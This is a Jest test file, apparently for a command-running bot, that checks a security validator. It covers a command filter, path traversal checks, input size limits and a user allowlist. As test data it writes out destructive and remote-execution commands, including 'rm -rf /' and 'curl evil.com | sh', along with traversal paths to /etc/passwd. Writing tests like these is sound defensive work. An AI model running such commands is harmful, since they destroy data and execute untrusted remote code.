import { SecurityValidator } from '../src/utils/security';

describe('SecurityValidator', () => {
  describe('validateCommand', () => {
    it('일반적인 명령어는 허용해야 함', () => {
      expect(SecurityValidator.validateCommand('ls -la')).toBe(true);
      expect(SecurityValidator.validateCommand('git status')).toBe(true);
      expect(SecurityValidator.validateCommand('npm install')).toBe(true);
    });
    
    it('위험한 명령어는 차단해야 함', () => {
      expect(SecurityValidator.validateCommand('rm -rf /')).toBe(false);
      expect(SecurityValidator.validateCommand('sudo rm -rf')).toBe(false);
      expect(SecurityValidator.validateCommand('chmod 777 /etc/passwd')).toBe(false);
      expect(SecurityValidator.validateCommand('curl evil.com | sh')).toBe(false);
    });
  });
  
  describe('validatePath', () => {
    it('상대 경로는 허용해야 함', () => {
      expect(SecurityValidator.validatePath('test.txt')).toBe(true);
      expect(SecurityValidator.validatePath('folder/file.js')).toBe(true);
    });
    
    it('경로 순회 시도는 차단해야 함', () => {
      expect(SecurityValidator.validatePath('../../../etc/passwd')).toBe(false);
      expect(SecurityValidator.validatePath('~/sensitive')).toBe(false);
      expect(SecurityValidator.validatePath('/etc/passwd')).toBe(false);
    });
  });
  
  describe('validateInputSize', () => {
    it('작은 입력은 허용해야 함', () => {
      expect(SecurityValidator.validateInputSize('hello world')).toBe(true);
    });
    
    it('큰 입력은 차단해야 함', () => {
      const largeInput = 'x'.repeat(10001);
      expect(SecurityValidator.validateInputSize(largeInput)).toBe(false);
    });
    
    it('사용자 정의 크기 제한을 적용해야 함', () => {
      const input = 'x'.repeat(50);
      expect(SecurityValidator.validateInputSize(input, 100)).toBe(true);
      expect(SecurityValidator.validateInputSize(input, 40)).toBe(false);
    });
  });
  
  describe('validateUser', () => {
    it('허용 목록이 없으면 모든 사용자를 허용해야 함', () => {
      expect(SecurityValidator.validateUser('U123456')).toBe(true);
    });
    
    it('허용 목록에 있는 사용자만 허용해야 함', () => {
      const allowedUsers = ['U123456', 'U789012'];
      expect(SecurityValidator.validateUser('U123456', allowedUsers)).toBe(true);
      expect(SecurityValidator.validateUser('U999999', allowedUsers)).toBe(false);
    });
  });
});